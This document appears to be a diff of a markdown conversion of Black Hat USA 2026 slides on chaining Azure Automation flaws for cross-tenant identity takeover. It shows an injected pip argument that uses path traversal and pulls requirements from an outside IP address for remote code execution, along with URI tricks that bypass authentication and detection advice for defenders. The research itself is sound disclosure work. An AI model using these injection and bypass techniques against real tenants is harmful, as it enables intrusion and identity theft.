@@ -8,19 +8,24 @@ year: 2026
 source_pdf: "BlackHat_USA_2026_Slides/Shay Shavit_Handle With Care Chaining Azure Automation Flaws for Cross-Tenant Identity Takeover.pdf"
 pages: 50
 sha256: "02c2912eeb1b9339611cae9ce233c513e2a8150b50d755583cd1f7e5be3ec953"
-text_chars: 17133
+text_chars: 17072
 ocr_pages: 3
 has_ocr: true
 redacted_secrets: 0
+ocr_confidence: 89.2
+ocr_unreliable_blocks: 0
+ocr_timeouts: 0
+pages_recovered_from_text_layer: 0
 companion_files: []
 extractor: "pymupdf4llm 1.28.2 + tesseract"
-converted_at: "2026-08-11T23:15:37Z"
+converted_at: "2026-08-12T05:43:27Z"
 ---
 # Handle With Care Chaining Azure Automation Flaws for Cross-Tenant Identity Takeover
 
 **Speakers:** Shay Shavit  
 **Conference:** Black Hat USA 2026  
 **Source:** `BlackHat_USA_2026_Slides/Shay Shavit_Handle With Care Chaining Azure Automation Flaws for Cross-Tenant Identity Takeover.pdf` (50 pages)
+
 
 ## Slide 1
 
@@ -38,7 +43,8 @@ Shay Shavit
 
 2
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 96/100 on the text kept, 96/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Shay Shavit
@@ -185,10 +191,10 @@ Metadata Command
 
 ###### PYTHON PACKAGE RCE
 
-```
+\```
 var pip = $"install --root {tempExtractionPath} --ignore-installed
 --no-deps --ignore-requires-python {wheelFilePath}";
-```
+\```
 
 12
 
@@ -196,10 +202,10 @@ var pip = $"install --root {tempExtractionPath} --ignore-installed
 
 ###### PYTHON PACKAGE RCE
 
-```
+\```
 pip.exe install --root C:/temp/jfdsa9rvfsd/ --ignore-installed --no-
 deps --ignore-requires-python
-```
+\```
 
 `C:/temp/jfdsa9rvfsd/../../../../../../../Python27/Tools/Scripts/ -r http://172.171.240.248/../../l -f-any` Install This
 
@@ -223,12 +229,12 @@ Requires This
 
 15
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 88/100 on the text kept, 86/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 LI DIDN'T WORK
 ng : An exception prevented st: . [sandboxId=583afSe-
-Pp P
 ‘a attempted to
 Methodology signal: when a bug doesn't chain, ask what boundary
 you actually need to cross
@@ -289,11 +295,11 @@ Network access was allowed from the internet unless restricted.
 
 ###### AUTH HANDLERS
 
-```
+\```
 HttpMessageHandler.Add(newCertificateHandler(container.Resolve<...
 HttpMessageHandler.Add(newJwtHandler(container.Resolve<...
 HttpMessageHandler.Add(newMIHandler(container.Resolve<…
-```
+\```
 
 ###### **Handlers are sequential, if one fails the other try to authenticate**
 
@@ -361,16 +367,16 @@ Gate 2 binds the token to the VM named by the request — not yet to the Automat
 
 ###### LOCATION LOCATION LOCATION
 
-```
+\```
 if (!IsLocation(request)){
 AssociateWorker();
 }
-```
+\```
 
-```
+\```
 private bool IsLocation(HttpRequestMessage request)
 {
-```
+\```
 
 `return request.RequestUri.AbsoluteUri.Contains(“location”); }` Fetch association info only if **not** location request
 
@@ -382,15 +388,12 @@ private bool IsLocation(HttpRequestMessage request)
 
 25
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 83/100 on the text kept, 43/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 LOCATION LOCATION LOCATION
 Pic:
-ances Uete Contains
-("/location=)
-Bs
-aoalle
 £ AbsolutePath, right?
 black hat
 2026 25
@@ -400,16 +403,16 @@ black hat
 
 ###### LOCATION LOCATION LOCATION
 
-```
+\```
 if (!IsLocation(request)){
 AssociateWorker();
 }
-```
+\```
 
-```
+\```
 private bool IsLocation(HttpRequestMessage request)
 {
-```
+\```
 
 `return request.RequestUri.AbsoluteUri.Contains(“location”); }` Fetch association info only if **not** location request AbsoluteUri includes query parameters... Appending &locations bypass the association check.
 
@@ -513,11 +516,11 @@ execution output, errors, environment details
 
 ###### DIFFERENT AUTH HANDLER
 
-```
+\```
 HttpMessageHandler.Add(newCertificateHandler(container.Resolve<...
 HttpMessageHandler.Add(newJwtHandler(container.Resolve<...
 HttpMessageHandler.Add(newMIHandler(container.Resolve<…
-```
+\```
 
 ###### **Another handler authorize MI tokens**
 
@@ -527,29 +530,29 @@ HttpMessageHandler.Add(newMIHandler(container.Resolve<…
 
 ###### ISMIREQUEST()
 
-```
+\```
 if (IsMIRequest(request.uri))
 {
-```
+\```
 
-```
+\```
     // Skip Auth Token based authentication
 return base.Send(request);
 }
-```
+\```
 
-```
+\```
 public staticboolIsMIRequest(Uri uri)
 {
-```
+\```
 
-```
+\```
 string guid = @”…”;
     Regex regex = new Regex($"/automationAccounts/{guid}/oauth2/token");
     Match match = regex.Match(uri.AbsolutePath);
 return match.Success;
 }
-```
+\```
 
 ###### From JwtHandler
 
@@ -585,29 +588,29 @@ JWTHalder executes before MIHandler. We can bypass JWT. Can we force the use of 
 
 ###### ISMIREQUEST()
 
-```
+\```
 if (IsMIRequest(request.uri))
 {
-```
+\```
 
-```
+\```
     // We Skip Auth Token based authentication
 return base.Send(request);
 }
-```
+\```
 
-```
+\```
 public staticboolIsMIRequest(Uri uri)
 {
-```
+\```
 
-```
+\```
 string guid = @”…”;
     Regex regex = new Regex($"/automationAccounts/{guid}/oauth2/token");
     Match match = regex.Match(uri.AbsolutePath);
 return match.Success;
 }
-```
+\```
 
 ###### From JwtHandler
 
@@ -876,9 +879,9 @@ JRDS calls where the caller's tenant ≠ the target Automation Account's tenant.
 
 **Cross-tenant hybrid worker registration is not a legitimate pattern.**
 
-```
+\```
 02
-```
+\```
 
 ###### **Suspicious query shape on token endpoints**
 
@@ -890,9 +893,9 @@ Requests to /automationAccounts/*/oauth2/token* containing &location, mixed casi
 
 **Both bypass primitives in this chain are visible at the URI layer.**
 
-```
+\```
 03
-```
+\```
 
 ###### **Managed-identity issuance without worker association**
 
